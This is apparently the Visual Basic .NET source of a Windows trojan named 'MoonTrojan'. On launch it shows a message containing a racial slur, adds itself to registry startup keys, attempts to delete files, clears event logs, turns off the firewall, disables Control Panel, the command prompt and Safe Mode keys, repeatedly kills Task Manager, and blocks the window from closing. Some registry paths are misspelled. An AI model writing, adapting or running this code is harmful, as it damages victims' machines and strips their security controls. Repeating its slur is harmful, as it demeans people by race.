Option Explicit On
Imports Microsoft.Win32
Imports System.IO

Public Class Form1
    Dim RegistryKey As Object

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Process.Start("http://4chan.org/pol")

        Dim t As New Threading.Thread(AddressOf Block)
        t.Start()
        MsgBox("MoonTrojan infected your shitty ass pc nigger")
        Cursor.Hide()


        Dim filepath As String
        Dim registrykey As Object
        filepath = Environ("homedrive") + "\programdata\MoonTrojan.exe"
        registrykey = CreateObject("Wscript.Shell")
        registrykey.regwrite("HKCU\software\microsoft\windows\currnetversion\run\MoonTrojan.exe", filepath)

        'Starts on startup
        My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)

        'Delete Files
        Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "C:\Windows"
        System.IO.Directory.Delete(path, True)


        'Clear Logs
        Shell("wevtutil clear-log")

        'Disable Firewall
        Shell("NetSh Advfirewall set allprofiles state off", vbHide)

        'Disable Control Panel
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\", "DisableControlPanle", "1", Microsoft.Win32.RegistryValueKind.DWord)

        'Disable CMD
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
        'My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)

        'Disabe safe
        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot\Minimal", "MinimalX", "1", Microsoft.Win32.RegistryValueKind.DWord)
        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot\Network", "NetworkX", "1", Microsoft.Win32.RegistryValueKind.DWord)


        Form2.Show()
        Form3.Show()
        Me.TopMost = True
    End Sub


    'Disable input/again
    Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean

    Public Shared Sub DisableInput(ByVal makeDisabled As Boolean)
        Dim n As Boolean = BlockInput(makeDisabled)
    End Sub

    Sub KillExplorer()

        Dim taskKill As ProcessStartInfo = New ProcessStartInfo("taskkill", "/F /IM explorer.exe")
        taskKill.WindowStyle = ProcessWindowStyle.Hidden
        Dim Process As Process = New Process()
        Process.StartInfo = taskKill
        Process.Start()
        Process.WaitForExit()
    End Sub

    'Kills TaskManager
    Sub Block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim h2 As Form6 = New Form6()
        Dim h3 As Form7 = New Form7()
        Dim h4 As Form8 = New Form8()

        h2.Show()
        h3.Show()
        h4.Show()

        h2.Location = New Point(Rnd() * 900, Rnd() * 100)
        h3.Location = New Point(Rnd() * 860, Rnd() * 300)
        h4.Location = New Point(Rnd() * 700, Rnd() * 485)
    End Sub

    Sub Shut()
        ' Shell("shutdown -t 5 -r -f")
    End Sub

    Private Sub Moon_Closing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
    End Sub
End Class